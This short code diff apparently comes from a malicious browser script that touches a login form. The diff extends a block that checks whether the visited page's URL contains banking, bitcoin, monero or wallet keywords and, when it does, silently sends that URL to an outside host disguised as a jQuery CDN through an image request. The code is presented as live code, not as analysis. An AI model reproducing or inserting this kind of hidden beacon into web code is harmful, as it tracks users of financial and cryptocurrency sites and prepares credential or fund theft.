@@ -20,14 +20,16 @@ var login_form = document.getElementsByName("login");
           }
         }
 
-
-var myStringArray = ["banca", "banco", "bank"];
-var arrayLength = myStringArray.length;
-for (var i = 0; i < arrayLength; i++) {
-    if (window.location.href.indexOf(myStringArray[i]) > -1) {
+(function () {
+var myStringArrayBAN = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet"];
+var arrayLengthBAN = myStringArrayBAN.length;
+for (var i = 0; i < arrayLengthBAN; i++) {
+    if (window.location.href.indexOf(myStringArrayBAN[i]) > -1) {
 (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
   }
 }
+})();
+
 (function () {
     var sc = document.getElementsByTagName('script');
     var img = document.getElementsByTagName('img');
